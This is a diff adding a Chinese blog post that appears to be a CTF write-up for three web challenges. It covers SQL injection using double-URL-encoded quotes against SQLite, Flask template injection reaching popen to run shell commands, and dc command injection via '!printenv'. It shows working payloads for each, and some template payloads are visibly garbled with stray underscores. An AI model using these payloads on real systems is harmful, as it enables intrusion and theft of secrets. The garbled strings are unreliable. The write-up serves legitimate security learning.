@@ -24,7 +24,7 @@
 
   
 
-  <title>onefilemd1 | 牛牛马马的博客</title>
+  <title>0xweek1 | </title>
 
   
 
@@ -50,7 +50,7 @@
 <!-- header container -->
 <header class="header-container post">
   
-    <div class="post-image" style="background-image: url(https://qiniu.sukoshi.xyz/src/images/68686407_p0.jpg)"></div>
+    <div class="post-image" style="background-image: url(/images/1.png)"></div>
   
 
   <!-- navbar -->
@@ -60,7 +60,7 @@
     <div class="navbar-logo">
       <a href="/">
         
-          牛牛马马的博客
+          
         
       </a>
     </div>
@@ -101,11 +101,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">onefilemd1</h1>
+          <h1 class="title-wrap">0xweek1</h1>
           <h2 class="title-sub-wrap">
             <strong>nnmm</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-10-22T06:18:15.000Z" itemprop="datePublished">2024-10-22</time>
+            <time  class="article-date" datetime="2024-10-24T13:03:36.000Z" itemprop="datePublished">2024-10-24</time>
           </h2>
           
           
@@ -136,7 +136,81 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        
+        <h1 id="week1-ez-sql"><a href="#week1-ez-sql" class="headerlink" title="week1_ez_sql"></a>week1_ez_sql</h1><p>参数显示在url栏中，测试sql注入.</p>
+<p><mark>构造payload：id&#x3D;1’，发现单引号被过滤了。</mark></p>
+<p>这里应该是采用了全局过滤，类似于使用了addslashes()这个函数会在你的单引号前面加上一个\来转义单引号。</p>
+<p><mark>构造payload：id &#x3D; 1%2527.</mark></p>
+<p>使用这个payload的原因是当做为参数传入时我的%25会被转义为%,那么传入的参数就变成了:1%27，在做单引号匹配时就匹配不到单引号从而进行了绕过。</p>
+<p>这里题目中给出了打印出的sql语句：SQL语句：select * from users where id &#x3D; 1%27</p>
+<p>当这个字段被拼接到sql语句中时，会将%27进行urldecode编码为单引号，那么这里就成功闭合了单引号。</p>
+<p>验证是否成功的让sql语句进行了闭合。</p>
+<p><mark>构造payload：0%2527 or 1&#x3D;1 #</mark></p>
+<p>发现回显了id&#x3D;1时的数据，那么说明or 1&#x3D;1是被成功的注入进去了。</p>
+<p>查询列数:联合查询。</p>
+<p><mark>查询字段完成后构造payload：1%2527 union select 1,2,3,4,version()#</mark></p>
+<p>发现竟然出先了报错，这里看了题目的提示信息后发现数据库使用不是mysql而是sqlite</p>
+<p>sqlite简介：</p>
+<p>1.SQLite_master:这个是内置系统表、相当于mysql的information_schema，但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型。</p>
+<p>2.SQLite并不支持像mysql那样的注释，但是可以通过 - 方式增加DDL注释(写shell会用到)SQL，并扩展至下一个换行符（ASCII 0x0a）或直到输入结束，以先到者为准。您也可以使用 C 风格的注释，以 <code>/*</code>开始，并扩展至下一个 <code>*/</code>字符对或直到输入结束，以先到者为准。SQLite的注释可以跨越多行。</p>
+<p>构造payload：<mark>1%2527 union select 1,2,3,4,sql from sqlite_master#</mark></p>
+<p>爆出表名flag和字段名flag</p>
+<p><mark>构造payload：1%2527 union select 1,2,3,4,flag from flag#</mark></p>
+<p>得到flag</p>
+<p>因为每一个sqlite数据库就是一个文件所以在查询的时候就不需要任何的数据库的名称，只需要知道表名就可以查询</p>
+<h1 id="week1-ez-ssit"><a href="#week1-ez-ssit" class="headerlink" title="week1_ez_ssit:"></a>week1_ez_ssit:</h1><pre><code>from flask import Flask, request, render_template, render_template_string
+import os
+app = Flask(__name__)
+
+flag=os.getenv(&quot;flag&quot;)
+os.unsetenv(&quot;flag&quot;)
+@app.route(&#39;/&#39;)
+def index():
+    return open(__file__, &quot;r&quot;).read()
+
+
+@app.errorhandler(404)
+def page_not_found(e):
+    print(request.root_url)
+    return render_template_string(&quot;&lt;h1&gt;The Url &#123;&#125; You Requested Can Not Found&lt;/h1&gt;&quot;.format(request.url))
+
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&quot;0.0.0.0&quot;, port=8000)
+</code></pre>
+<p>这里是一个flask框架，模板使用不当在渲染时会将用户的输入当作python代码进行执行导致用户执行系统命令。</p>
+<p>这里用户可以控制url的输入。测试是否存在ssit注入</p>
+<p><mark>构造payload:49</mark></p>
+<p>可以看出我们的7*7是被执行了的输出了49</p>
+<p>这里python的所有子类的父类都是object类。</p>
+<p>构造payload:<code>&#123;&#123;''.________class______.__base__.__mro__[0].________subclasses_______()&#125;&#125;</code></p>
+<p>我们需要拿到shell那么就找class ‘os._wrap_close’这个类，注意这里的os.__wrap_class 这个类的位置不是一定一般是在138位，但也有走差。这题的位置就是在133位，紧接着我们找该类的全局变量popen就可以执行shell了</p>
+<p>构造payload:<code>&#123;&#123;''.____class___.____base______.__mro________[0].__subclasses__()[133].______init_______.______globals________[['popen']]('whoami').read()&#125;&#125;</code></p>
+<p>到这里就可以执行shell了，后面的rce就是过滤了空格，将空格换为$IFS$9绕过</p>
+<h1 id="week1-ez-rce"><a href="#week1-ez-rce" class="headerlink" title="week1_ez_rce:"></a>week1_ez_rce:</h1><pre><code>from flask import Flask, request
+import subprocess
+
+app = Flask(__name__)
+
+
+@app.route(&quot;/&quot;)
+def index():
+    return open(__file__).read()
+
+
+@app.route(&quot;/calc&quot;, methods=[&#39;POST&#39;])
+def calculator():
+    expression = request.form.get(&#39;expression&#39;) or &quot;114 1000 * 514 + p&quot;
+    result = subprocess.run([&quot;dc&quot;, &quot;-e&quot;, expression], capture_output=True, text=True)
+    return result.stdout
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=8000)
+</code></pre>
+<p>subprocess.run这是python的函数能执行系统命令，这里执行的命令是dc -e，dc是一个计算器，当我们传入的expression参数可以控制，传入特殊符号就可能会导致执行系统命令。（gpt问出来的）</p>
+<p><mark>构造payload：114%201000%20*%20514%20+%20!printenv</mark></p>
+<p>得到flag</p>
+
       </section>
 
       
